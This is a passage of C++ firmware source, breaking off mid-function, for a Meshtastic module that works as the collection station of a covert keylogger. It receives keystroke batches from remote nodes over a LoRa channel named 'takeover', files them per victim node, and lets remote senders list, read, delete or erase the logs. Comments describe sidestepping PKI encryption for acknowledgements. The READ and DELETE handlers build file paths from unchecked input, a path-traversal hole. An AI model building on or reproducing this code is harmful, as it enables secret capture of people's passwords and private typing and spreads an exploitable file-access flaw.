/**
 * @file KeylogReceiverModule.cpp
 * @brief Keylog receiver module implementation for Heltec V4 base station
 *
 * NASA Power of 10 Compliance:
 *  - Rule 1: Simple control flow (no goto, setjmp, recursion)
 *  - Rule 2: All loops have fixed upper bounds
 *  - Rule 3: No dynamic memory after init
 *  - Rule 4: Assertions verify all assumptions
 *  - Rule 5: Data declared at smallest scope
 *  - Rule 6: All return values checked
 *  - Rule 7: Limited pointer dereferencing
 *  - Rule 8: Preprocessor used sparingly
 *  - Rule 9: Limited function pointer use
 *  - Rule 10: Compile with all warnings enabled
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "KeylogReceiverModule.h"
#include "MeshService.h"
#include "Router.h"
#include "FSCommon.h"
#include "gps/RTC.h"
#include <cassert>

// Module instance
KeylogReceiverModule *keylogReceiverModule = nullptr;

// Base directory for keylog storage
static const char *KEYLOG_BASE_DIR = "/keylogs";

// Base64 encoding table
static const char BASE64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

KeylogReceiverModule::KeylogReceiverModule()
    : SinglePortModule("keylog", static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM)),
      concurrency::OSThread("KeylogReceiver"),
      totalBatchesReceived(0),
      totalBatchesStored(0),
      totalAcksSent(0),
      storageErrors(0),
      lastStatsLog(0),
      serialCmdLen(0),
      serialResponsePending(false),
      duplicatesDetected(0),
      lastDedupSave(0),
      dedupCacheDirty(false)
{
    // NASA Rule 4: Assert invariants at construction
    assert(KEYLOG_MAX_PATH_LEN >= 64);
    assert(KEYLOG_ACK_BUFFER_SIZE >= 16);

    // Initialize serial command buffer
    memset(serialCmdBuffer, 0, sizeof(serialCmdBuffer));

    // Initialize dedup cache to empty (NASA Rule 3: no dynamic allocation)
    memset(dedupCache, 0, sizeof(dedupCache));
}

bool KeylogReceiverModule::init()
{
    LOG_INFO("[KeylogReceiver] Initializing keylog receiver module");

    // Create base directory if it doesn't exist
    if (!FSCom.exists(KEYLOG_BASE_DIR)) {
        if (!FSCom.mkdir(KEYLOG_BASE_DIR)) {
            LOG_ERROR("[KeylogReceiver] Failed to create %s directory", KEYLOG_BASE_DIR);
            return false;
        }
        LOG_INFO("[KeylogReceiver] Created %s directory", KEYLOG_BASE_DIR);
    }

    // Load dedup cache from flash (or start fresh)
    if (loadDedupCache()) {
        LOG_INFO("[KeylogReceiver] Loaded dedup cache from flash");
    } else {
        LOG_INFO("[KeylogReceiver] Starting with fresh dedup cache");
    }

    LOG_INFO("[KeylogReceiver] Module initialized successfully");
    LOG_INFO("[KeylogReceiver] Serial commands enabled - send LOGS:LIST, LOGS:STATS, etc.");
    return true;
}

int32_t KeylogReceiverModule::runOnce()
{
    // Check for serial commands every 100ms
    checkSerialCommands();
    return 100;
}

void KeylogReceiverModule::checkSerialCommands()
{
    // Check if Serial has data
    while (Serial.available() > 0) {
        char c = Serial.read();

        // Handle end of line (CR or LF)
        if (c == '\n' || c == '\r') {
            if (serialCmdLen > 0) {
                // Null-terminate the command
                serialCmdBuffer[serialCmdLen] = '\0';

                // Check if it's a LOGS:* command
                if (strncmp(serialCmdBuffer, KEYLOG_CMD_PREFIX, KEYLOG_CMD_PREFIX_LEN) == 0) {
                    LOG_INFO("[KeylogReceiver] Serial command: %s", serialCmdBuffer);
                    handleSerialCommand(serialCmdBuffer, serialCmdLen);
                }

                // Reset buffer for next command
                serialCmdLen = 0;
                memset(serialCmdBuffer, 0, sizeof(serialCmdBuffer));
            }
            continue;
        }

        // Add character to buffer if room (NASA Rule 2: bounded buffer)
        if (serialCmdLen < KEYLOG_SERIAL_BUFFER_SIZE - 1) {
            serialCmdBuffer[serialCmdLen++] = c;
        }
    }
}

void KeylogReceiverModule::handleSerialCommand(const char *cmd, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(cmd != nullptr);

    // Skip the "LOGS:" prefix
    const char *cmdBody = cmd + KEYLOG_CMD_PREFIX_LEN;
    size_t cmdBodyLen = len - KEYLOG_CMD_PREFIX_LEN;

    // Parse command type (first token before ':')
    char cmdType[16];
    size_t cmdTypeLen = 0;

    // NASA Rule 2: Fixed upper bound
    for (size_t i = 0; i < cmdBodyLen && i < sizeof(cmdType) - 1; i++) {
        if (cmdBody[i] == ':' || cmdBody[i] == '\0' || cmdBody[i] == '\n' || cmdBody[i] == '\r') {
            break;
        }
        cmdType[cmdTypeLen++] = cmdBody[i];
    }
    cmdType[cmdTypeLen] = '\0';

    LOG_DEBUG("[KeylogReceiver] Serial command type: '%s'", cmdType);

    // Set flag to indicate responses should go to serial
    serialResponsePending = true;

    // Dispatch to appropriate handler (reuse existing handlers)
    if (strcmp(cmdType, "LIST") == 0) {
        handleListCommand(0);  // 0 = serial response mode
    } else if (strcmp(cmdType, "STATS") == 0) {
        handleStatsCommand(0);
    } else if (strcmp(cmdType, "ERASE_ALL") == 0) {
        handleEraseAllCommand(0);
    } else if (strcmp(cmdType, "READ") == 0) {
        // Format: READ:<node>:<filename>
        if (cmdTypeLen + 1 < cmdBodyLen) {
            const char *args = cmdBody + cmdTypeLen + 1;
            size_t argsLen = cmdBodyLen - cmdTypeLen - 1;

            char nodeHex[KEYLOG_NODE_HEX_LEN];
            char filename[KEYLOG_MAX_PATH_LEN];

            // Find colon separator
            size_t colonPos = 0;
            for (size_t i = 0; i < argsLen && i < 64; i++) {
                if (args[i] == ':') {
                    colonPos = i;
                    break;
                }
            }

            if (colonPos > 0 && colonPos < KEYLOG_NODE_HEX_LEN) {
                memcpy(nodeHex, args, colonPos);
                nodeHex[colonPos] = '\0';

                size_t filenameLen = argsLen - colonPos - 1;
                if (filenameLen > 0 && filenameLen < sizeof(filename)) {
                    memcpy(filename, args + colonPos + 1, filenameLen);
                    filename[filenameLen] = '\0';

                    handleReadCommand(0, nodeHex, filename);
                    serialResponsePending = false;
                    return;
                }
            }
        }
        sendSerialResponse("{\"status\":\"error\",\"command\":\"read\",\"message\":\"Invalid format. Use LOGS:READ:<node>:<filename>\"}");
    } else if (strcmp(cmdType, "DELETE") == 0) {
        // Format: DELETE:<node>:<filename>
        if (cmdTypeLen + 1 < cmdBodyLen) {
            const char *args = cmdBody + cmdTypeLen + 1;
            size_t argsLen = cmdBodyLen - cmdTypeLen - 1;

            char nodeHex[KEYLOG_NODE_HEX_LEN];
            char filename[KEYLOG_MAX_PATH_LEN];

            size_t colonPos = 0;
            for (size_t i = 0; i < argsLen && i < 64; i++) {
                if (args[i] == ':') {
                    colonPos = i;
                    break;
                }
            }

            if (colonPos > 0 && colonPos < KEYLOG_NODE_HEX_LEN) {
                memcpy(nodeHex, args, colonPos);
                nodeHex[colonPos] = '\0';

                size_t filenameLen = argsLen - colonPos - 1;
                if (filenameLen > 0 && filenameLen < sizeof(filename)) {
                    memcpy(filename, args + colonPos + 1, filenameLen);
                    filename[filenameLen] = '\0';

                    handleDeleteCommand(0, nodeHex, filename);
                    serialResponsePending = false;
                    return;
                }
            }
        }
        sendSerialResponse("{\"status\":\"error\",\"command\":\"delete\",\"message\":\"Invalid format. Use LOGS:DELETE:<node>:<filename>\"}");
    } else {
        sendSerialResponse("{\"status\":\"error\",\"command\":\"unknown\",\"message\":\"Unknown command. Use LIST, READ, DELETE, STATS, or ERASE_ALL\"}");
    }

    serialResponsePending = false;
}

void KeylogReceiverModule::sendSerialResponse(const char *response)
{
    // NASA Rule 4: Validate input
    assert(response != nullptr);

    // Write response with unique markers to distinguish from debug output
    // Format: <<JSON>>{...}<</JSON>>
    Serial.print("<<JSON>>");
    Serial.print(response);
    Serial.println("<</JSON>>");
    Serial.flush();

    LOG_DEBUG("[KeylogReceiver] Serial response sent (%u bytes)", strlen(response));
}

ProcessMessage KeylogReceiverModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    // NASA Rule 4: Validate all inputs with assertions
    assert(mp.decoded.payload.size <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Only process port 490 packets
    if (mp.decoded.portnum != KEYLOG_RECEIVER_PORTNUM) {
        return ProcessMessage::CONTINUE;
    }

    // v7.0: Only process packets on channel 1 "takeover"
    // This filters out any packets on other channels using the same port
    if (mp.channel != KEYLOG_RECEIVER_CHANNEL) {
        return ProcessMessage::CONTINUE;
    }

    const uint8_t *payload = mp.decoded.payload.bytes;
    const size_t payloadLen = mp.decoded.payload.size;

    // NASA Rule 6: Check bounds before processing
    if (payloadLen < KEYLOG_BATCH_HEADER_SIZE) {
        LOG_WARN("[KeylogReceiver] Payload too small: %u bytes", payloadLen);
        return ProcessMessage::CONTINUE;
    }

    // Check if this is an ACK response (starts with "ACK:")
    // ACK responses are for the sender, not for us to process
    if (payloadLen >= 4 && payload[0] == 'A' && payload[1] == 'C' &&
        payload[2] == 'K' && payload[3] == ':') {
        // This is an ACK, not a batch - let it pass through
        return ProcessMessage::CONTINUE;
    }

    // Check if this is a LOGS:* command for remote keylog access
    // NASA Rule 2: Fixed comparison length
    if (payloadLen >= KEYLOG_CMD_PREFIX_LEN &&
        strncmp((const char *)payload, KEYLOG_CMD_PREFIX, KEYLOG_CMD_PREFIX_LEN) == 0) {
        const char *cmd = (const char *)payload + KEYLOG_CMD_PREFIX_LEN;
        size_t cmdLen = payloadLen - KEYLOG_CMD_PREFIX_LEN;
        LOG_INFO("[KeylogReceiver] Received command from !%08x: %.*s", mp.from, (int)payloadLen, payload);
        return handleLogsCommand(mp.from, cmd, cmdLen);
    }

    totalBatchesReceived++;

    /* REQ-PROTO-001: Detect protocol format using magic marker
     * New format (v1.0+): [magic:2][version:2][batch_id:4][data:N]
     * Old format (legacy): [batch_id:4][data:N]
     * Detection: If bytes[0..1] == 0x55 0x4B ("UK"), it's new format */
    bool isNewFormat = (payloadLen >= KEYLOG_NEW_HEADER_SIZE &&
                        payload[0] == KEYLOG_PROTOCOL_MAGIC_0 &&
                        payload[1] == KEYLOG_PROTOCOL_MAGIC_1);

    uint32_t batchId = 0;
    const uint8_t *keystrokeData = nullptr;
    size_t keystrokeLen = 0;
    uint8_t protocolMajor = 0;
    uint8_t protocolMinor = 0;

    if (isNewFormat) {
        /* New format: batch_id at offset 4, data at offset 8 */
        protocolMajor = payload[2];
        protocolMinor = payload[3];

        /* Extract batch_id (little-endian at offset 4) */
        batchId |= ((uint32_t)payload[4]);
        batchId |= ((uint32_t)payload[5]) << 8;
        batchId |= ((uint32_t)payload[6]) << 16;
        batchId |= ((uint32_t)payload[7]) << 24;

        keystrokeData = payload + KEYLOG_NEW_HEADER_SIZE;
        keystrokeLen = payloadLen - KEYLOG_NEW_HEADER_SIZE;

        LOG_INFO("[KeylogReceiver] Batch 0x%08lX from !%08x v%u.%u (%u bytes)",
                 (unsigned long)batchId, mp.from, protocolMajor, protocolMinor, keystrokeLen);
    } else {
        /* Old format (legacy): batch_id at offset 0, data at offset 4 */
        batchId |= ((uint32_t)payload[0]);
        batchId |= ((uint32_t)payload[1]) << 8;
        batchId |= ((uint32_t)payload[2]) << 16;
        batchId |= ((uint32_t)payload[3]) << 24;

        keystrokeData = payload + KEYLOG_BATCH_HEADER_SIZE;
        keystrokeLen = payloadLen - KEYLOG_BATCH_HEADER_SIZE;

        LOG_INFO("[KeylogReceiver] Batch 0x%08lX from !%08x (legacy format, %u bytes)",
                 (unsigned long)batchId, mp.from, keystrokeLen);
    }

    // Check for duplicate BEFORE storing (handles retransmissions when ACK was lost)
    if (isDuplicateBatch(mp.from, batchId)) {
        duplicatesDetected++;
        LOG_INFO("[KeylogReceiver] Duplicate batch 0x%08lX from !%08x (already stored)",
                 (unsigned long)batchId, mp.from);

        // Still send ACK so sender can clear its FRAM
        if (sendAck(mp.from, batchId)) {
            totalAcksSent++;
            LOG_DEBUG("[KeylogReceiver] Re-sent ACK for duplicate batch 0x%08lX", (unsigned long)batchId);
        }
        return ProcessMessage::STOP;
    }

    // Store to flash
    bool stored = storeKeystrokeBatch(mp.from, batchId, keystrokeData, keystrokeLen);

    if (stored) {
        totalBatchesStored++;

        // Record in dedup cache AFTER successful store
        recordReceivedBatch(mp.from, batchId);

        // Debounced save to flash
        saveDedupCacheIfNeeded();

        // Send ACK back to sender
        if (sendAck(mp.from, batchId)) {
            totalAcksSent++;
            LOG_INFO("[KeylogReceiver] ACK sent for batch 0x%08lX", (unsigned long)batchId);
        } else {
            LOG_ERROR("[KeylogReceiver] Failed to send ACK for batch 0x%08lX", (unsigned long)batchId);
        }
    } else {
        storageErrors++;
        LOG_ERROR("[KeylogReceiver] Failed to store batch 0x%08lX", (unsigned long)batchId);
    }

    // Log stats periodically
    uint32_t now = millis();
    if (now - lastStatsLog >= KEYLOG_STATS_LOG_INTERVAL_MS) {
        lastStatsLog = now;
        LOG_INFO("[KeylogReceiver] Stats: rx=%lu stored=%lu acks=%lu errors=%lu dups=%lu",
                 (unsigned long)totalBatchesReceived,
                 (unsigned long)totalBatchesStored,
                 (unsigned long)totalAcksSent,
                 (unsigned long)storageErrors,
                 (unsigned long)duplicatesDetected);
    }

    return ProcessMessage::STOP;
}

bool KeylogReceiverModule::storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                                                const uint8_t *data, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(data != nullptr || len == 0);
    assert(len <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Ensure node directory exists
    if (!ensureNodeDirectory(from)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory for node !%08x", from);
        return false;
    }

    // Get log file path
    char pathBuf[KEYLOG_MAX_PATH_LEN];
    if (!getLogFilePath(from, pathBuf)) {
        LOG_ERROR("[KeylogReceiver] Failed to generate path for node !%08x", from);
        return false;
    }

    // Open file in append mode
    // NASA Rule 6: Check return value
    File file = FSCom.open(pathBuf, "a");
    if (!file) {
        LOG_ERROR("[KeylogReceiver] Failed to open %s for writing", pathBuf);
        return false;
    }

    // Write batch header with timestamp
    uint32_t timestamp = getValidTime(RTCQualityFromNet);
    int headerLen = file.printf("\n--- Batch 0x%08lX at %lu ---\n",
                                 (unsigned long)batchId, (unsigned long)timestamp);
    if (headerLen <= 0) {
        LOG_ERROR("[KeylogReceiver] Failed to write batch header");
        file.close();
        return false;
    }

    // Write keystroke data
    // NASA Rule 2: Fixed upper bound on write
    size_t written = 0;
    if (len > 0) {
        written = file.write(data, len);
    }

    // Add newline after data
    file.println();

    // Flush and close
    file.flush();
    file.close();

    if (written != len) {
        LOG_ERROR("[KeylogReceiver] Partial write: %u of %u bytes", written, len);
        return false;
    }

    LOG_DEBUG("[KeylogReceiver] Stored %u bytes to %s", len, pathBuf);
    return true;
}

bool KeylogReceiverModule::ensureNodeDirectory(NodeNum nodeId)
{
    // Build directory path: /keylogs/<node_hex>/
    char dirPath[KEYLOG_MAX_PATH_LEN];

    // NASA Rule 6: Check snprintf return
    int pathLen = snprintf(dirPath, sizeof(dirPath), "%s/%08x", KEYLOG_BASE_DIR, nodeId);
    if (pathLen < 0 || pathLen >= (int)sizeof(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Directory path overflow");
        return false;
    }

    // Check if exists
    if (FSCom.exists(dirPath)) {
        return true;
    }

    // Create directory
    if (!FSCom.mkdir(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory %s", dirPath);
        return false;
    }

    LOG_INFO("[KeylogReceiver] Created directory %s", dirPath);
    return true;
}

bool KeylogReceiverModule::getLogFilePath(NodeNum nodeId, char *pathBuf)
{
    // NASA Rule 4: Validate output buffer
    assert(pathBuf != nullptr);

    // Get current date for filename
    uint32_t timestamp = getValidTime(RTCQualityFromNet);

    // Convert to date components
    // Using simple day calculation (days since epoch)
    // For proper date formatting, we'd need time.h but this is simpler
    uint32_t days = timestamp / 86400;
    uint32_t year = 1970;
    uint32_t month = 1;
    uint32_t day = 1;

    // NASA Rule 2: Fixed upper bound on loop iterations
    // Calculate year (max 200 iterations covers 1970-2170)
    for (uint32_t i = 0; i < 200 && days >= 365; i++) {
        bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
        uint32_t daysInYear = leap ? 366 : 365;
        if (days >= daysInYear) {
            days -= daysInYear;
            year++;
        } else {
            break;
        }
    }

    // Days in each month (non-leap year default)
    static const uint8_t daysInMonth[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};

    // Calculate month (max 12 iterations)
    for (uint32_t m = 0; m < 12 && days >= daysInMonth[m]; m++) {
        uint32_t dim = daysInMonth[m];
        // Adjust February for leap year
        if (m == 1) {
            bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
            if (leap) {
                dim = 29;
            }
        }
        if (days >= dim) {
            days -= dim;
            month++;
        } else {
            break;
        }
    }
    day = days + 1;

    // Build path: /keylogs/<node_hex>/keylog_YYYY-MM-DD.txt
    int pathLen = snprintf(pathBuf, KEYLOG_MAX_PATH_LEN,
                           "%s/%08x/keylog_%04lu-%02lu-%02lu.txt",
                           KEYLOG_BASE_DIR, nodeId,
                           (unsigned long)year, (unsigned long)month, (unsigned long)day);

    // NASA Rule 6: Check for truncation
    if (pathLen < 0 || pathLen >= KEYLOG_MAX_PATH_LEN) {
        LOG_ERROR("[KeylogReceiver] Path truncated");
        return false;
    }

    return true;
}
/* v7.5: Broadcast ACK with sender ID to bypass PKI encryption issue
 * Format: "ACK:0x{batch_id}:!{receiver_node}" allows multi-XIAO support
 * Broadcasts never use PKI (Router.cpp:614), solving the decryption failure */
bool KeylogReceiverModule::sendAck(NodeNum to, uint32_t batchId)
{
    // NASA Rule 4: Validate original sender (for logging only, we broadcast anyway)
    if (to == 0) {
        LOG_ERROR("[KeylogReceiver] Invalid original sender: %08x", to);
        return false;
    }

    // Build ACK string with sender ID: "ACK:0x12345678:!a1b2c3d4"
    // Format enables multi-XIAO deployments to filter ACKs by receiver node
    char ackBuf[KEYLOG_ACK_BUFFER_SIZE];
    int ackLen = snprintf(ackBuf, sizeof(ackBuf), "ACK:0x%08lX:!%08x",
                          (unsigned long)batchId, nodeDB->getNodeNum());

    // NASA Rule 6: Check for truncation
    if (ackLen < 0 || ackLen >= (int)sizeof(ackBuf)) {
        LOG_ERROR("[KeylogReceiver] ACK buffer overflow");
        return false;
    }

    // Allocate packet
    meshtastic_MeshPacket *reply = allocDataPacket();
    if (reply == nullptr) {
        LOG_ERROR("[KeylogReceiver] Failed to allocate ACK packet");
        return false;
    }

    // Configure packet (v7.5: broadcast to bypass PKI encryption)
    reply->to = NODENUM_BROADCAST;  // Broadcast - bypasses PKI entirely
    reply->channel = KEYLOG_RECEIVER_CHANNEL;
    reply->decoded.portnum = static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM);
    reply->want_ack = false;  // ACK doesn't need ACK
    reply->priority = meshtastic_MeshPacket_Priority_HIGH;

    // Copy ACK payload
    // NASA Rule 4: Assert bounds
    assert((size_t)ackLen < sizeof(reply->decoded.payload.bytes));
    memcpy(reply->decoded.payload.bytes, ackBuf, ackLen + 1);
    reply->decoded.payload.size = ackLen;

    // Send packet
    service->sendToMesh(reply, RX_SRC_LOCAL, true);

    LOG_DEBUG("[KeylogReceiver] Broadcast ACK for !%08x: %s", to, ackBuf);
    return true;
}

// ==================== Command Handling Implementation ====================

ProcessMessage KeylogReceiverModule::handleLogsCommand(NodeNum from, const char *cmd, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(cmd != nullptr);
    assert(len < KEYLOG_MAX_PAYLOAD_SIZE);

    // Parse command type (first token before ':')
    // NASA Rule 2: Fixed upper bound on command length
    char cmdType[16];
    size_t cmdTypeLen = 0;

    // Extract command type (e.g., "LIST", "READ", "DELETE", "STATS")
    for (size_t i = 0; i < len && i < sizeof(cmdType) - 1; i++) {
        if (cmd[i] == ':' || cmd[i] == '\0' || cmd[i] == '\n' || cmd[i] == '\r') {
            break;
        }
        cmdType[cmdTypeLen++] = cmd[i];
    }
    cmdType[cmdTypeLen] = '\0';

    LOG_DEBUG("[KeylogReceiver] Command type: '%s' (len=%u)", cmdType, cmdTypeLen);

    // Dispatch to appropriate handler
    if (strcmp(cmdType, "LIST") == 0) {
        handleListCommand(from);
        return ProcessMessage::STOP;
    }

    if (strcmp(cmdType, "STATS") == 0) {
        handleStatsCommand(from);
        return ProcessMessage::STOP;
    }

    if (strcmp(cmdType, "ERASE_ALL") == 0) {
        handleEraseAllCommand(from);
        return ProcessMessage::STOP;
    }

    if (strcmp(cmdType, "READ") == 0) {
        // Format: READ:<node>:<filename>
        // Find the arguments after "READ:"
        if (cmdTypeLen + 1 < len) {
            const char *args = cmd + cmdTypeLen + 1;  // Skip "READ:"
            size_t argsLen = len - cmdTypeLen - 1;

            // Parse node (8 hex chars)
            char nodeHex[KEYLOG_NODE_HEX_LEN];
            char filename[KEYLOG_MAX_PATH_LEN];

            // NASA Rule 2: Fixed iteration bound
            size_t colonPos = 0;
            for (size_t i = 0; i < argsLen && i < 64; i++) {
                if (args[i] == ':') {
                    colonPos = i;
                    break;
                }
            }

            if (colonPos > 0 && colonPos < KEYLOG_NODE_HEX_LEN) {
                // Copy node hex
                memcpy(nodeHex, args, colonPos);
                nodeHex[colonPos] = '\0';

                // Copy filename (rest after colon)
                size_t filenameLen = argsLen - colonPos - 1;
                if (filenameLen > 0 && filenameLen < sizeof(filename)) {
                    memcpy(filename, args + colonPos + 1, filenameLen);
                    filename[filenameLen] = '\0';

                    handleReadCommand(from, nodeHex, filename);
                    return ProcessMessage::STOP;
                }
            }
        }
        sendResponse(from, "{\"status\":\"error\",\"command\":\"read\",\"message\":\"Invalid format. Use READ:<node>:<filename>\"}");
        return ProcessMessage::STOP;
    }

    if (strcmp(cmdType, "DELETE") == 0) {
        // Format: DELETE:<node>:<filename>
        if (cmdTypeLen + 1 < len) {
            const char *args = cmd + cmdTypeLen + 1;
            size_t argsLen = len - cmdTypeLen - 1;

            char nodeHex[KEYLOG_NODE_HEX_LEN];
            char filename[KEYLOG_MAX_PATH_LEN];

            size_t colonPos = 0;
            for (size_t i = 0; i < argsLen && i < 64; i++) {
                if (args[i] == ':') {
                    colonPos = i;
                    break;
                }
            }

            if (colonPos > 0 && colonPos < KEYLOG_NODE_HEX_LEN) {
                memcpy(nodeHex, args, colonPos);
                nodeHex[colonPos] = '\0';

                size_t filenameLen = argsLen - colonPos - 1;
                if (filenameLen > 0 && filenameLen < sizeof(filename)) {
                    memcpy(filename, args + colonPos + 1, filenameLen);
                    filename[filenameLen] = '\0';

                    handleDeleteCommand(from, nodeHex, filename);
                    return ProcessMessage::STOP;
                }
            }
        }
        sendResponse(from, "{\"status\":\"error\",\"command\":\"delete\",\"message\":\"Invalid format. Use DELETE:<node>:<filename>\"}");
        return ProcessMessage::STOP;
    }

    // Unknown command
    sendResponse(from, "{\"status\":\"error\",\"command\":\"unknown\",\"message\":\"Unknown command. Use LIST, READ, DELETE, STATS, or ERASE_ALL\"}");
    return ProcessMessage::STOP;
}

bool KeylogReceiverModule::handleListCommand(NodeNum from)
{
    LOG_INFO("[KeylogReceiver] Handling LIST command from !%08x", from);

    // Build JSON response with all files
    // NASA Rule 3: Fixed buffer, no dynamic allocation
    char json[KEYLOG_JSON_MAX_LEN];
    int pos = 0;
    uint32_t fileCount = 0;
    bool firstFile = true;

    // Start JSON object
    pos += snprintf(json + pos, sizeof(json) - pos,
                    "{\"status\":\"ok\",\"command\":\"list\",\"files\":[");

    // Open base directory
    File baseDir = FSCom.open(KEYLOG_BASE_DIR);
    if (!baseDir || !baseDir.isDirectory()) {
        snprintf(json, sizeof(json),
                 "{\"status\":\"ok\",\"command\":\"list\",\"files\":[],\"count\":0}");
        sendResponse(from, json);
        if (baseDir) {
            baseDir.close();
        }
        return true;
    }

    // Iterate over node directories (NASA Rule 2: bounded iteration)
    File nodeDir = baseDir.openNextFile();
    uint32_t nodeCount = 0;

    while (nodeDir && nodeCount < KEYLOG_MAX_NODES) {
        if (nodeDir.isDirectory()) {
            const char *nodeName = nodeDir.name();

            // Iterate files in this node directory
            File logFile = nodeDir.openNextFile();
            uint32_t filesInNode = 0;

            while (logFile && filesInNode < KEYLOG_MAX_FILES_PER_NODE) {
                if (!logFile.isDirectory()) {
                    // Check if we have room for this entry (~80 chars per entry)
                    if (pos + 100 < (int)sizeof(json)) {
                        // Add comma separator
                        if (!firstFile) {
                            pos += snprintf(json + pos, sizeof(json) - pos, ",");
                        }
                        firstFile = false;

                        // Add file entry as JSON object
                        pos += snprintf(json + pos, sizeof(json) - pos,
                                        "{\"node\":\"%s\",\"name\":\"%s\",\"size\":%lu}",
                                        nodeName, logFile.name(), (unsigned long)logFile.size());
                    }
                    fileCount++;
                    filesInNode++;
                }
                logFile.close();
                logFile = nodeDir.openNextFile();
            }
            if (logFile) {
                logFile.close();
            }
        }
        nodeDir.close();
        nodeDir = baseDir.openNextFile();
        nodeCount++;
    }

    if (nodeDir) {
        nodeDir.close();
    }
    baseDir.close();

    // Close JSON array and add count
    snprintf(json + pos, sizeof(json) - pos, "],\"count\":%lu}", (unsigned long)fileCount);

    sendResponse(from, json);

    LOG_INFO("[KeylogReceiver] LIST: found %lu files", (unsigned long)fileCount);
    return true;
}

bool KeylogReceiverModule::handleReadCommand(NodeNum from, const char *node, const char *filename)
{
    // NASA Rule 4: Validate inputs
    assert(node != nullptr);
    assert(filename != nullptr);

    LOG_INFO("[KeylogReceiver] READ: node=%s file=%s", node, filename);

    // Build full path
    char path[KEYLOG_MAX_PATH_LEN];
    int pathLen = snprintf(path, sizeof(path), "%s/%s/%s", KEYLOG_BASE_DIR, node, filename);

    if (pathLen < 0 || pathLen >= (int)sizeof(path)) {
        char json[KEYLOG_JSON_MAX_LEN];
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"read\",\"message\":\"Path too long\"}");
        sendResponse(from, json);
        return false;
    }

    // Check if file exists
    if (!FSCom.exists(path)) {
        char json[KEYLOG_JSON_MAX_LEN];
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"read\",\"message\":\"File not found: %s/%s\"}",
                 node, filename);
        sendResponse(from, json);
        return false;
    }

    // Open file
    File file = FSCom.open(path, "r");
    if (!file) {
        char json[KEYLOG_JSON_MAX_LEN];
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"read\",\"message\":\"Cannot open file\"}");
        sendResponse(from, json);
        return false;
    }

    size_t fileSize = file.size();

    // Read file content (limited to KEYLOG_BASE64_MAX_INPUT bytes)
    // NASA Rule 3: Fixed buffer, no dynamic allocation
    // Use static buffers to avoid stack overflow (~9KB would overflow task stack)
    static uint8_t fileContent[KEYLOG_BASE64_MAX_INPUT];
    size_t bytesToRead = (fileSize > sizeof(fileContent)) ? sizeof(fileContent) : fileSize;
    size_t bytesRead = file.read(fileContent, bytesToRead);
    bool truncated = (fileSize > sizeof(fileContent));

    file.close();

    // Base64 encode the content
    // Output size: ((bytesRead + 2) / 3) * 4 + 1
    static char base64Content[((KEYLOG_BASE64_MAX_INPUT + 2) / 3) * 4 + 1];
    size_t base64Len = base64Encode(fileContent, bytesRead, base64Content, sizeof(base64Content));

    // Build JSON response (static to avoid stack overflow)
    static char json[KEYLOG_JSON_MAX_LEN];
    int pos = snprintf(json, sizeof(json),
                       "{\"status\":\"ok\",\"command\":\"read\","
                       "\"node\":\"%s\",\"file\":\"%s\",\"size\":%lu",
                       node, filename, (unsigned long)fileSize);

    if (truncated) {
        pos += snprintf(json + pos, sizeof(json) - pos,
                        ",\"truncated\":true,\"bytesReturned\":%lu",
                        (unsigned long)bytesRead);
    }

    // Add base64 data
    snprintf(json + pos, sizeof(json) - pos, ",\"data\":\"%s\"}", base64Content);

    sendResponse(from, json);

    LOG_INFO("[KeylogReceiver] READ: sent %lu bytes (base64: %lu chars)%s",
             (unsigned long)bytesRead, (unsigned long)base64Len,
             truncated ? " [truncated]" : "");
    return true;
}

bool KeylogReceiverModule::handleDeleteCommand(NodeNum from, const char *node, const char *filename)
{
    // NASA Rule 4: Validate inputs
    assert(node != nullptr);
    assert(filename != nullptr);

    LOG_INFO("[KeylogReceiver] DELETE: node=%s file=%s", node, filename);

    // Build full path
    char path[KEYLOG_MAX_PATH_LEN];
    int pathLen = snprintf(path, sizeof(path), "%s/%s/%s", KEYLOG_BASE_DIR, node, filename);

    char json[KEYLOG_JSON_MAX_LEN];

    if (pathLen < 0 || pathLen >= (int)sizeof(path)) {
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"delete\",\"message\":\"Path too long\"}");
        sendResponse(from, json);
        return false;
    }

    // Check if file exists
    if (!FSCom.exists(path)) {
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"delete\",\"message\":\"File not found: %s/%s\"}",
                 node, filename);
        sendResponse(from, json);
        return false;
    }

    // Delete file
    if (FSCom.remove(path)) {
        snprintf(json, sizeof(json),
                 "{\"status\":\"ok\",\"command\":\"delete\",\"node\":\"%s\",\"file\":\"%s\"}",
                 node, filename);
        sendResponse(from, json);
        LOG_INFO("[KeylogReceiver] Deleted file: %s", path);
        return true;
    } else {
        snprintf(json, sizeof(json),
                 "{\"status\":\"error\",\"command\":\"delete\",\"message\":\"Failed to delete file\"}");
        sendResponse(from, json);
        LOG_ERROR("[KeylogReceiver] Failed to delete: %s", path);
        return false;
    }
}

bool KeylogReceiverModule::handleStatsCommand(NodeNum from)
{
    LOG_INFO("[KeylogReceiver] STATS command from !%08x", from);

    // Count files and total size
    uint32_t totalFiles = 0;
    uint32_t totalBytes = 0;
    uint32_t nodeCount = 0;

    File baseDir = FSCom.open(KEYLOG_BASE_DIR);
    if (baseDir && baseDir.isDirectory()) {
        File nodeDir = baseDir.openNextFile();

